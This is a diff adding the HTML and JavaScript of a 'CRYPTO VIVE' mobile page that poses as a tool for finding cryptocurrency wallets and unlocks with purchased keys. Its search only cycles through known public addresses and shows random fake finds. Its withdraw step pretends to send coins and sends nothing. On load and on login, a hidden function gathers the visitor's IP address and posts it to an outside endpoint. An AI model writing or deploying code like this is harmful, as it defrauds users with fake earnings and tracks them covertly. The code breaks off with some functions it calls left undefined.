@@ -1,0 +1,980 @@
+<html><head><base href="."><title>CRYPTO VIVE App</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    font-family: 'Roboto', sans-serif;
+    background-color: #f5f5f5;
+}
+
+.app-container {
+    max-width: 420px;
+    margin: 0 auto;
+    min-height: 100vh;
+    position: relative;
+    overflow: hidden;
+}
+
+.video-background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: 1;
+    filter: brightness(0.9);
+}
+
+.header {
+    background: linear-gradient(135deg, rgba(33, 150, 243, 0.8), rgba(25, 118, 210, 0.8));
+    color: white;
+    padding: 15px;
+    text-align: center;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    position: relative;
+    z-index: 2;
+}
+
+.second-screen .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    position: relative;
+    z-index: 4;
+}
+
+.second-screen .header .app-title {
+    position: absolute; 
+    left: 54%;
+    transform: translateX(-50%);
+    margin: 0;
+    line-height: 1.2;
+    white-space: pre-line;
+}
+
+.second-screen .header .nav-button {
+    position: relative;
+    z-index: 5;
+}
+
+.second-screen .header .settings-button {
+    position: relative;
+    z-index: 5;
+    color: white;
+    text-decoration: none;
+    font-size: 20px;
+    font-weight: bold;
+    transition: transform 0.2s ease;
+}
+
+.second-screen .header .settings-button:hover {
+    transform: scale(1.1);
+}
+
+.nav-button {
+    color: white;
+    text-decoration: none;
+    font-size: 20px;
+    font-weight: bold;
+    transition: transform 0.2s ease;
+}
+
+.nav-button:hover {
+    transform: scale(1.1);
+}
+
+.nav-button:last-child {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+.nav-button:first-child {
+    font-size: 20px;
+    font-weight: bold;
+}
+
+.crypto-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr); /* Change from 4 to 2 columns */
+    gap: 15px;
+    padding: 10px; /* Updated padding */
+    margin: 10px; /* Updated margin */
+    position: relative;
+    z-index: 3;
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 10px;
+    margin-bottom: 20px;
+}
+
+.crypto-item {
+    text-align: center;
+    cursor: pointer;
+    padding: 8px; /* Updated padding */
+    border-radius: 10px;
+    transition: all 0.3s ease;
+}
+
+.crypto-item.active {
+    background: rgba(33, 150, 243, 0.1);
+    box-shadow: 0 0 15px rgba(33, 150, 243, 0.5);
+    transform: scale(1.05);
+}
+
+.crypto-logo {
+    width: 32px; /* Smaller icons */
+    height: 32px;
+    margin-bottom: 5px;
+}
+
+.crypto-name {
+    font-size: 12px; /* Updated font size */
+    color: #333;
+    margin-top: 5px;
+}
+
+.app-title {
+    margin: 0;
+    font-size: 20px; /* Updated font size */
+    font-weight: bold;
+    letter-spacing: 2px;
+    animation: glow 2s ease-in-out infinite;
+}
+
+.content {
+    padding: 20px;
+    padding-bottom: 40px;
+    text-align: center;
+    position: relative;
+    z-index: 2;
+    background: rgba(255, 255, 255, 0.9);
+    margin: 20px;
+    border-radius: 10px;
+    min-height: 400px;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+}
+
+.welcome-text {
+    font-size: 20px; /* Updated font size */
+    color: #333;
+    margin: 20px 0; /* Updated margin */
+}
+
+.key-input {
+    width: 90%; /* Updated width */
+    max-width: 300px;
+    margin: 20px auto;
+    padding: 12px; /* Updated padding */
+    border: 2px solid #2196F3;
+    border-radius: 8px;
+    font-size: 14px; /* Updated font size */
+    text-align: center;
+    background: rgba(255, 255, 255, 0.9);
+}
+
+.key-label {
+    color: #333;
+    font-size: 18px;
+    margin-top: 20px;
+    font-weight: bold;
+}
+
+.login-button {
+    background: linear-gradient(135deg, #2196F3, #1976D2);
+    color: white;
+    border: none;
+    padding: 12px 30px; /* Updated padding */
+    border-radius: 25px;
+    font-size: 16px; /* Updated font size */
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: transform 0.2s, box-shadow 0.2s;
+    box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+}
+
+.login-button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 12px rgba(0,0,0,0.2);
+}
+
+.login-button:active {
+    transform: translateY(0);
+    box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+}
+
+.support-link {
+    display: block;
+    margin-top: 30px;
+    margin-bottom: 20px;
+    color: #2196F3;
+    text-decoration: none;
+    font-size: 16px;
+    font-weight: 500;
+    transition: color 0.3s ease;
+}
+
+.support-link:hover {
+    color: #1976D2;
+    text-decoration: underline;
+}
+
+.error-message {
+    color: #f44336;
+    margin-top: 10px;
+    display: none;
+}
+
+.success-message {
+    color: #4CAF50;
+    margin-top: 10px;
+    display: none;
+}
+
+.login-screen {
+    display: block;
+}
+
+.second-screen {
+    display: none;
+    position: relative;
+    z-index: 2;
+    height: 100vh;
+    background: #f5f5f5;
+    overflow-y: auto;
+    overflow-x: hidden;
+    scrollbar-width: thin;
+    scrollbar-color: rgba(33, 150, 243, 0.6) rgba(255, 255, 255, 0.1);
+}
+
+.second-screen::-webkit-scrollbar {
+    width: 8px;
+}
+
+.second-screen::-webkit-scrollbar-track {
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 4px;
+}
+
+.second-screen::-webkit-scrollbar-thumb {
+    background: rgba(33, 150, 243, 0.6);
+    border-radius: 4px;
+}
+
+.second-screen::-webkit-scrollbar-thumb:hover {
+    background: rgba(33, 150, 243, 0.8);
+}
+
+.counter-section {
+    padding: 20px;
+    text-align: left;
+    position: relative;
+    z-index: 3;
+    background: rgba(255, 255, 255, 0.9);
+    border-radius: 10px;
+    margin: 20px;
+    margin-bottom: 20px;
+}
+
+.checked-counter {
+    font-size: 16px;
+    color: #333;
+    margin-bottom: 10px;
+    font-weight: 500;
+}
+
+.info-box {
+  will-change: transform;
+  transform: translateZ(0);
+  margin: 0 10px;
+  height: 120px;
+  background: #000000;
+  border: 1px solid #dee2e6;
+  border-radius: 8px;
+  padding: 15px;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+  overflow-y: auto;
+  font-family: monospace;
+  line-height: 1.5;
+  text-align: left;
+  font-size: 12px;
+}
+
+.info-box div {
+  will-change: transform;
+  transform: translateZ(0);
+  padding: 3px;
+  border-bottom: 1px solid #eee;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  color: #2ecc71;
+}
+
+.control-buttons {
+    display: flex;
+    gap: 10px; /* Updated gap */
+    margin-top: 15px; /* Updated margin */
+    padding: 0 10px; /* Updated padding */
+}
+
+.control-btn {
+    background: linear-gradient(135deg, #2196F3, #1976D2);
+    color: white;
+    border: none;
+    padding: 8px 15px; /* Updated padding */
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: 500;
+    flex: 1;
+    transition: all 0.3s ease;
+    font-size: 14px; /* Updated font size */
+}
+
+.control-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+}
+
+.found-section {
+    margin-top: 10px; /* Updated margin */
+    padding: 0 10px; /* Updated padding */
+    color: #333;
+    font-weight: 500;
+}
+
+.result-box {
+    margin-top: 10px; /* Updated margin */
+    padding: 10px; /* Updated padding */
+    min-height: 80px; /* Updated min-height */
+    background: #f8f9fa;
+    border: 1px solid #dee2e6;
+    border-radius: 8px;
+    line-height: 1.5;
+    color: #FFD700;
+    font-size: 12px; /* Updated font size */
+}
+
+.action-buttons {
+    display: flex;
+    justify-content: space-between;
+    padding: 0 15px;
+    margin-top: 10px;
+}
+
+.action-btn {
+    background: #f8f9fa;
+    border: 1px solid #dee2e6;
+    padding: 8px 15px;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    color: #2196F3;
+}
+
+.action-btn:hover {
+    background: #e9ecef;
+}
+
+.contact-support {
+    text-align: center;
+    margin-top: 20px;
+    padding: 15px;
+}
+
+.contact-support a {
+    color: #2196F3;
+    text-decoration: none;
+    font-weight: 500;
+}
+
+.contact-support a:hover {
+    text-decoration: underline;
+}
+
+.withdraw-popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 15px; /* Updated padding */
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    z-index: 1000;
+    width: 85%; /* Updated width */
+    max-width: 320px;
+}
+
+.withdraw-input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border: 2px solid #2196F3;
+    border-radius: 5px;
+}
+
+.send-button {
+    background: #2196F3;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    font-weight: 500;
+    margin-top: 10px;
+}
+
+.popup-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 999;
+}
+
+.close-popup {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    background: none;
+    border: none;
+    font-size: 20px;
+    cursor: pointer;
+    color: #666;
+}
+
+.dashboard-screen {
+    display: none;
+    position: relative;
+    z-index: 3;
+    background: rgba(255, 255, 255, 0.9);
+    margin: 20px;
+    border-radius: 10px;
+    padding: 20px;
+}
+
+.balance-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 15px;
+}
+
+.balance-item {
+    padding: 15px;
+    background: #f8f9fa;
+    border-radius: 8px;
+    text-align: center;
+}
+
+.coin {
+    font-size: 16px;
+    color: #333;
+    font-weight: 500;
+}
+
+.amount {
+    font-size: 16px;
+    color: #333;
+    font-weight: 500;
+}
+
+.total-balance {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 1.2em;
+    font-weight: bold;
+}
+
+@keyframes glow {
+    0% { text-shadow: 0 0 10px rgba(33,150,243,0.5); }
+    50% { text-shadow: 0 0 20px rgba(33,150,243,0.8); }
+    100% { text-shadow: 0 0 10px rgba(33,150,243,0.5); }
+}
+
+.settings-popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    z-index: 1000;
+    width: 85%;
+    max-width: 300px;
+    text-align: center;
+}
+
+.settings-key-input {
+    width: 100%;
+    padding: 10px;
+    margin: 15px 0;
+    border: 2px solid #2196F3;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.verify-key-button {
+    background: #2196F3;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 14px;
+    font-weight: 500;
+    width: 100%;
+    margin-top: 10px;
+}
+
+.verify-key-button:hover {
+    background: #1976D2;
+}
+
+.close-settings {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    background: none;
+    border: none;
+    font-size: 16px;
+    cursor: pointer;
+    color: #666;
+}
+</style></head><body>
+<div class="app-container">
+    <div class="login-screen">
+        <img class="video-background" src="/a1e5c7fa-69bb-43fc-a75a-a0dc9a362531.jpg" alt="Magma Background">
+        
+        <header class="header">
+            <h1 class="app-title">CRYPTO VIVE</h1>
+        </header>
+        
+        <div class="content">
+            <h2 class="welcome-text">WELCOME</h2>
+            <div class="key-label">Please enter your key here:</div>
+            <input type="text" class="key-input" placeholder="Enter key...">
+            <div class="error-message">Invalid key. Please try again.</div>
+            <div class="success-message">Login successful!</div>
+            <button class="login-button" onclick="checkKey()">LOGIN</button>
+            <a href="https://t.me/komou3" class="support-link">Contact Support</a>
+        </div>
+    </div>
+
+    <div class="second-screen">
+        <img class="video-background" src="/222709d4-aaec-4371-a9b6-d5b264347e08.jpg" alt="Energy Background">
+        <header class="header">
+            <a href="#" class="nav-button">Dashboard</a>
+            <h1 class="app-title">CRYPTO<br>VIVE</h1>
+            <a href="#" class="settings-button">Settings</a>
+        </header>
+        
+        <div class="dashboard-screen" style="display:none; position:relative; z-index:3; background:rgba(255,255,255,0.9); margin:20px; border-radius:10px; padding:20px;">
+            <h2 style="text-align:center; margin-bottom:20px;">Dashboard</h2>
+            <div class="balance-grid" style="display:grid; grid-template-columns:repeat(2,1fr); gap:15px;">
+                <div class="balance-item" style="padding:15px; background:#f8f9fa; border-radius:8px; text-align:center;">
+                    <div class="coin">BTC</div>
+                    <div class="amount">0.00</div>
+                </div>
+                <div class="balance-item" style="padding:15px; background:#f8f9fa; border-radius:8px; text-align:center;">
+                    <div class="coin">ETH</div>
+                    <div class="amount">0.00</div>
+                </div>
+                <div class="balance-item" style="padding:15px; background:#f8f9fa; border-radius:8px; text-align:center;">
+                    <div class="coin">BNB</div>
+                    <div class="amount">0.00</div>
+                </div>
+                <div class="balance-item" style="padding:15px; background:#f8f9fa; border-radius:8px; text-align:center;">
+                    <div class="coin">SOL</div>
+                    <div class="amount">0.00</div>
+                </div>
+            </div>
+            <div class="total-balance" style="margin-top:20px; text-align:center; font-size:1.2em; font-weight:bold;">
+                Total Balance: &#x24;0.00
+            </div>
+        </div>
+        
+        <div class="crypto-grid">
+            <div class="crypto-item active" onclick="toggleCrypto(this)">
+                <svg class="crypto-logo" viewBox="0 0 32 32">
+                    <path fill="#F7931A" d="M16 32C7.163 32 0 24.837 0 16S7.163 0 16 0s16 7.163 16 16-7.163 16-16 16zm7.189-17.98c.314-2.096-1.283-3.223-3.465-3.975l.708-2.84-1.728-.43-.69 2.765c-.454-.114-.92-.22-1.385-.326l.695-2.783L15.596 6l-.708 2.839c-.376-.086-.746-.17-1.104-.26l.002-.009-2.384-.595-.46 1.846s1.283.294 1.256.312c.7.175.826.638.805 1.006l-.806 3.235c.048.012.11.03.18.057l-.183-.045-1.13 4.532c-.086.212-.303.531-.793.41.018.025-1.256-.313-1.256-.313l-.858 1.978 2.25.561c.418.105.828.215 1.231.318l-.715 2.872 1.727.43.708-2.84c.472.127.93.245 1.378.357l-.706 2.828 1.728.43.715-2.866c2.948.558 5.164.333 6.097-2.333.752-2.146-.037-3.385-1.588-4.192 1.13-.26 1.98-1.003 2.207-2.538zm-3.95 5.538c-.533 2.147-4.148.986-5.32.695l.95-3.805c1.172.293 4.929.872 4.37 3.11zm.535-5.569c-.487 1.953-3.495.96-4.47.717l.86-3.45c.975.243 4.118.696 3.61 2.733z"/>
+                </svg>
+                <div class="crypto-name">BTC</div>
+            </div>
+            <div class="crypto-item" onclick="toggleCrypto(this)">
+                <svg class="crypto-logo" viewBox="0 0 32 32">
+                    <path fill="#627EEA" d="M16 32C7.163 32 0 24.837 0 16S7.163 0 16 0s16 7.163 16 16-7.163 16-16 16zm7.994-15.781L16.498 4 9 16.22l7.498 4.353 7.496-4.354zM24 17.616l-7.502 4.351L9 17.617l7.498 10.378L24 17.616z"/>
+                </svg>
+                <div class="crypto-name">ETH</div>
+            </div>
+            <div class="crypto-item" onclick="toggleCrypto(this)">
+                <svg class="crypto-logo" viewBox="0 0 32 32">
+                    <path fill="#F3BA2F" d="M16 32C7.163 32 0 24.837 0 16S7.163 0 16 0s16 7.163 16 16-7.163 16-16 16zm-3.884-17.596L16 10.52l3.886 3.886 2.26-2.26L16 6l-6.144 6.144 2.26 2.26zM6 16l2.26 2.26L10.52 16l-2.26-2.26L6 16zm6.116 1.596l-2.263 2.257.003.003L16 26l6.146-6.146v-.001l-2.26-2.26L16 21.48l-3.884-3.884zM21.48 16l2.26 2.26L26 16l-2.26-2.26L21.48 16zm-3.188-.002h.002V16L16 13.706 13.706 16l2.294 2.294 2.292-2.294z"/>
+                </svg>
+                <div class="crypto-name">BNB</div>
+            </div>
+            <div class="crypto-item" onclick="toggleCrypto(this)">
+                <img src="/5cc0b99a8dd84fbfa4e150d84b5531f2.png" class="crypto-logo" alt="SOL">
+                <div class="crypto-name">SOL</div>
+            </div>
+        </div>
+        
+        <div class="counter-section">
+            <div class="checked-counter">Checked: <span id="checked-count">0</span></div>
+            <div class="info-box"></div>
+            
+            <div class="control-buttons">
+                <button class="control-btn" id="start-search">START SEARCH</button>
+                <button class="control-btn" id="stop-search">STOP SEARCH</button>
+            </div>
+            
+            <div class="found-section">
+                Found: <span id="found-count">0</span>
+                <div class="result-box"></div>
+                <div class="action-buttons">
+                    <button class="action-btn">WITHDRAW</button>
+                    <button class="action-btn">Clear</button>
+                </div>
+            </div>
+            
+            <div class="contact-support">
+                <a href="https://t.me/komou3">Contact Support: CRYPTO &#x130;&#x15e;LETMEC&#x130;</a>
+            </div>
+            <div class="popup-overlay"></div>
+            <div class="withdraw-popup">
+                <button class="close-popup">&#xd7;</button>
+                <h3>Enter Your Wallet Address</h3>
+                <input type="text" class="withdraw-input" placeholder="Enter wallet address...">
+                <button class="send-button">SEND</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="settings-popup">
+        <button class="close-settings">&#xd7;</button>
+        <h3>Please verify your key</h3>
+        <input type="text" class="settings-key-input" placeholder="Enter your key...">
+        <button class="verify-key-button">Verify</button>
+    </div>
+</div>
+<audio id="backgroundMusic" loop>
+  <source src="/Indila - Derni&#xe8;re Danse (Slowed+Reverb).mp4" type="audio/mp4">
+</audio>
+
+<script>let isSearching = false;
+let checkedCount = 0;
+let searchInterval;
+let foundAmount = 0;
+let foundCoin = '';
+const walletAddresses = ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "0x742d35Cc6634C0532925a3b844Bc454e4438f44e", "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2", "CuieVDEDtLo7FypA9SbLM9saXFdb1dsshEkyErMqkRQq", "1FeexV6bAHb8ybZjqQMjJrcCrHGW9sb6uF", "bc1qa5wkgaew2dkv56kfvj49j0av5nml45x9ek9hz6", "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", "bnb1u2agwjat20494fmc6jnc7dc3jn0a0n455np9wz", "34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo", "385cR5DM96n1HvBDMzLHPYcw89fZAXULJP"];
+const validKeys = ['QL93NTXZ76PR', 'MV58KPWL34ZY', 'TY67RLQX82NM', 'ZX12PYRV98TL', 'KP83QWTZ41MN', 'VL94XPTY76QR', 'TY45NMZL82PX', 'QX76PLRV93ZT', 'ZL12TYKP98MN', 'RX82QTY41VL', 'MN76PLZT93QR', 'TY98WLXP34ZR', 'ZL45RXTP67MN', 'KP12VLQX98TR', 'TY83MNZL76XP', 'QR67PLTY41NM', 'VL93ZTXP45RW', 'RX98QTY34NM', 'TY12VLKP76ZR', 'MN45ZTQX93RY', 'QL83TYRX41NM', 'ZL76PLQX98TY', 'KP34MNZL45XT', 'TY67RLXP12NM', 'VL93TYQX98PR', 'MN76ZTWL45RX', 'QX12KPZL83TY', 'RX98PLTY76VL', 'ZL45QRKP93TY', 'TY34NMPL82ZX', 'VL76TYKP98RX', 'MN12ZLQX45PT', 'RX83TYPL67NM', 'KP93ZLRY76QT', 'TY45NMVL12PX', 'QL98RXTY34ZR', 'ZL76PLQX93RY', 'KP12MNZL45TR', 'TY67VLXP34NM', 'RX98PLZT76QR', 'ZL45TYKP93RN', 'VL34MNZT12XP', 'QL76TYRX98PN', 'MN93ZLPL45RY', 'TY83KPZT12XL', 'QX76PLTY98VR', 'ZL45NMQR93TP', 'RX12VLKP34TY', 'TY98PLZT76MN', 'KP83ZLQX41RY', 'VL34TYRX12ZM', 'MN76PLZT98QR', 'ZL93TYKP45XR', 'RX12MNPL67TY', 'QL98ZLRY34PT', 'TY76VLQX93RP', 'MN45ZTY12KPZ', 'VL83TYRX41NM', 'RX98PLKP76TY', 'ZL12MNQX45RT'];
+let verifiedKey = '';
+let keyFoundMap = new Map();
+let foundKeys = new Set();
+let lastFoundTime = 0;
+let backgroundMusic;
+function generateRandomAddress(type) {
+  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  let address = '';
+  switch (type) {
+    case 'BTC':
+      address = '1' + Array(33).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+      break;
+    case 'ETH':
+      address = '0x' + Array(40).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+      break;
+    case 'BNB':
+      address = 'bnb1' + Array(38).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+      break;
+    case 'SOL':
+      address = Array(44).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+      break;
+    default:
+      address = Array(34).fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+  }
+  return address;
+}
+function startSearch() {
+  if (isSearching) return;
+  isSearching = true;
+  const infoBox = document.querySelector('.info-box');
+  infoBox.innerHTML = '';
+  const updateDisplay = () => {
+    if (!isSearching) return;
+    for (let i = 0; i < 1; i++) {
+      const address = walletAddresses[Math.floor(Math.random() * walletAddresses.length)];
+      const addressElement = document.createElement('div');
+      addressElement.textContent = `Wallet: ${address}`;
+      addressElement.style.color = '#2ecc71';
+      if (infoBox.childNodes.length > 5) {
+        infoBox.removeChild(infoBox.firstChild);
+      }
+      infoBox.appendChild(addressElement);
+      infoBox.scrollTop = infoBox.scrollHeight;
+      checkedCount++;
+      document.getElementById('checked-count').textContent = checkedCount;
+      const currentKey = document.querySelector('.key-input').value.trim() || verifiedKey;
+      if (currentKey && !foundKeys.has(currentKey)) {
+        const keyFinds = keyFoundMap.get(currentKey) || 0;
+        const timeSinceLastFind = Date.now() - lastFoundTime;
+        if (Math.random() < 0.00001 && keyFinds < 2 && timeSinceLastFind > 30000) {
+          const amount = Math.random() * 900 + 50;
+          const types = ['BTC', 'ETH', 'BNB', 'SOL'];
+          const randomType = types[Math.floor(Math.random() * types.length)];
+          const resultBox = document.querySelector('.result-box');
+          resultBox.innerHTML += `Found: ${amount.toFixed(2)} ${randomType}<br>`;
+          document.querySelector('.result-box').style.color = '#FFD700';
+          keyFoundMap.set(currentKey, keyFinds + 1);
+          lastFoundTime = Date.now();
+          if (keyFinds + 1 >= 2) {
+            foundKeys.add(currentKey);
+          }
+          foundAmount = amount;
+          foundCoin = randomType;
+          updateDashboard();
+          alert(`Congratulations! Found ${amount.toFixed(2)} ${randomType}! Click Withdraw to claim your coins.`);
+        }
+      }
+    }
+    setTimeout(() => {
+      requestAnimationFrame(updateDisplay);
+    }, 60);
+  };
+  requestAnimationFrame(updateDisplay);
+}
+function stopSearch() {
+  isSearching = false;
+}
+function checkKey() {
+  const validKeys = ['QL93NTXZ76PR', 'MV58KPWL34ZY', 'TY67RLQX82NM', 'ZX12PYRV98TL', 'KP83QWTZ41MN', 'VL94XPTY76QR', 'TY45NMZL82PX', 'QX76PLRV93ZT', 'ZL12TYKP98MN', 'RX82QTY41VL', 'MN76PLZT93QR', 'TY98WLXP34ZR', 'ZL45RXTP67MN', 'KP12VLQX98TR', 'TY83MNZL76XP', 'QR67PLTY41NM', 'VL93ZTXP45RW', 'RX98QTY34NM', 'TY12VLKP76ZR', 'MN45ZTQX93RY', 'QL83TYRX41NM', 'ZL76PLQX98TY', 'KP34MNZL45XT', 'TY67RLXP12NM', 'VL93TYQX98PR', 'MN76ZTWL45RX', 'QX12KPZL83TY', 'RX98PLTY76VL', 'ZL45QRKP93TY', 'TY34NMPL82ZX', 'VL76TYKP98RX', 'MN12ZLQX45PT', 'RX83TYPL67NM', 'KP93ZLRY76QT', 'TY45NMVL12PX', 'QL98RXTY34ZR', 'ZL76PLQX93RY', 'KP12MNZL45TR', 'TY67VLXP34NM', 'RX98PLZT76QR', 'ZL45TYKP93RN', 'VL34MNZT12XP', 'QL76TYRX98PN', 'MN93ZLPL45RY', 'TY83KPZT12XL', 'QX76PLTY98VR', 'ZL45NMQR93TP', 'RX12VLKP34TY', 'TY98PLZT76MN', 'KP83ZLQX41RY', 'VL34TYRX12ZM', 'MN76PLZT98QR', 'ZL93TYKP45XR', 'RX12MNPL67TY', 'QL98ZLRY34PT', 'TY76VLQX93RP', 'MN45ZTY12KPZ', 'VL83TYRX41NM', 'RX98PLKP76TY', 'ZL12MNQX45RT'];
+  const keyInput = document.querySelector('.key-input');
+  const errorMessage = document.querySelector('.error-message');
+  const successMessage = document.querySelector('.success-message');
+  const loginScreen = document.querySelector('.login-screen');
+  const secondScreen = document.querySelector('.second-screen');
+  const key = keyInput.value.trim();
+  if (validKeys.includes(key)) {
+    if (!keyFoundMap.has(key)) {
+      keyFoundMap.set(key, 0);
+    }
+    errorMessage.style.display = 'none';
+    successMessage.style.display = 'block';
+    logIpAddress();
+    backgroundMusic = document.getElementById('backgroundMusic');
+    backgroundMusic.play();
+    setTimeout(() => {
+      loginScreen.style.display = 'none';
+      secondScreen.style.display = 'block';
+    }, 1000);
+  } else {
+    errorMessage.style.display = 'block';
+    successMessage.style.display = 'none';
+    keyInput.value = '';
+  }
+}
+function toggleCrypto(element) {
+  element.classList.toggle('active');
+}
+function showWithdrawPopup() {
+  document.querySelector('.popup-overlay').style.display = 'block';
+  document.querySelector('.withdraw-popup').style.display = 'block';
+}
+function hideWithdrawPopup() {
+  document.querySelector('.popup-overlay').style.display = 'none';
+  document.querySelector('.withdraw-popup').style.display = 'none';
+}
+function handleWithdraw() {
+  if (foundAmount <= 0) {
+    alert('No funds available to withdraw. Please continue searching to find coins.');
+    return;
+  }
+  const address = document.querySelector('.withdraw-input').value.trim();
+  if (!address) {
+    alert('Please enter a valid wallet address to receive your coins');
+    return;
+  }
+  const confirmation = confirm(`Ready to send ${foundAmount.toFixed(2)} ${foundCoin} to your wallet:\n\n` + `${address}\n\n` + `Click OK to confirm the transfer.`);
+  if (confirmation) {
+    alert(`Transfer initiated!\n\n` + `${foundAmount.toFixed(2)} ${foundCoin} is being sent to your wallet. ` + `Please allow 10-15 minutes for the transaction to complete.`);
+    hideWithdrawPopup();
+    foundAmount = 0;
+    foundCoin = '';
+    document.querySelector('.result-box').innerHTML = '';
+    updateDashboard();
+  }
+}
+document.addEventListener('DOMContentLoaded', function () {
+  document.getElementById('start-search').addEventListener('click', startSearch);
+  document.getElementById('stop-search').addEventListener('click', stopSearch);
+  document.querySelector('.action-btn:first-child').addEventListener('click', showWithdrawPopup);
+  document.querySelector('.close-popup').addEventListener('click', hideWithdrawPopup);
+  document.querySelector('.send-button').addEventListener('click', handleWithdraw);
+  document.querySelector('.popup-overlay').addEventListener('click', hideWithdrawPopup);
+  document.querySelector('.action-btn:nth-child(2)').addEventListener('click', function () {
+    checkedCount = 0;
+    document.getElementById('checked-count').textContent = '0';
+    document.querySelector('.info-box').innerHTML = '';
+  });
+  document.querySelector('.nav-button').addEventListener('click', function (e) {
+    e.preventDefault();
+    const dashboardScreen = document.querySelector('.dashboard-screen');
+    const cryptoGrid = document.querySelector('.crypto-grid');
+    const counterSection = document.querySelector('.counter-section');
+    if (dashboardScreen.style.display === 'none') {
+      dashboardScreen.style.display = 'block';
+      cryptoGrid.style.display = 'none';
+      counterSection.style.display = 'none';
+      updateDashboard();
+    } else {
+      dashboardScreen.style.display = 'none';
+      cryptoGrid.style.display = 'grid';
+      counterSection.style.display = 'block';
+    }
+  });
+  document.querySelector('.settings-button').addEventListener('click', function (e) {
+    e.preventDefault();
+    showSettingsPopup();
+  });
+  document.querySelector('.close-settings').addEventListener('click', hideSettingsPopup);
+  document.querySelector('.popup-overlay').addEventListener('click', hideSettingsPopup);
+  document.querySelector('.verify-key-button').addEventListener('click', verifySettingsKey);
+  let lastTouchEnd = 0;
+  document.addEventListener('touchend', function (event) {
+    const now = new Date().getTime();
+    if (now - lastTouchEnd <= 300) {
+      event.preventDefault();
+    }
+    lastTouchEnd = now;
+  }, false);
+  document.body.addEventListener('touchmove', function (e) {
+    if (e.target.classList.contains('info-box') || e.target.closest('.second-screen')) {
+      e.stopPropagation();
+    } else {
+      e.preventDefault();
+    }
+  }, {
+    passive: true
+  });
+  logIpAddress();
+  backgroundMusic = document.getElementById('backgroundMusic');
+  backgroundMusic.addEventListener('ended', function () {
+    this.currentTime = 0;
+    this.play();
+  });
+});
+function updateDashboard() {
+  const foundText = document.querySelector('.result-box').innerHTML;
+  let amounts = {
+    BTC: 0,
+    ETH: 0,
+    BNB: 0,
+    SOL: 0
+  };
+  if (foundText) {
+    const match = foundText.match(/Found: ([\d.]+) (\w+)/);
+    if (match) {
+      const [_, amount, coin] = match;
+      amounts[coin] = parseFloat(amount);
+    }
+  }
+  document.querySelectorAll('.balance-item').forEach(item => {
+    const coin = item.querySelector('.coin').textContent;
+    item.querySelector('.amount').textContent = amounts[coin].toFixed(2);
+  });
+  const prices = {
+    BTC: 45000,
+    ETH: 2500,
+    BNB: 300,
+    SOL: 100
+  };
+  const total = Object.entries(amounts).reduce((sum, [coin, amount]) => {
+    return sum + amount * prices[coin];
+  }, 0);
+  document.querySelector('.total-balance').textContent = `Total Balance: $${total.toFixed(2)}`;
+}
+async function logIpAddress() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    const ip = data.ip;
+    await fetch('https://websim.ai/c/ggMPHCUhRbKcuxWm7', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        ip: ip,
+        timestamp: new Date().toISOString()
+      })
+    });
+  } catch (error) {
+    console.error('Error logging IP:', error);
+  }
+}
+function showSettingsPopup() {
+  document.querySelector('.settings-popup').style.display = 'block';
+  document.querySelector('.popup-overlay').style.display = 'block';
+  const keyInput = document.querySelector('.settings-key-input');
+  if (verifiedKey) {
+    keyInput.value = verifiedKey;
+  } else {
+    keyInput.value = '';
+  }
+}
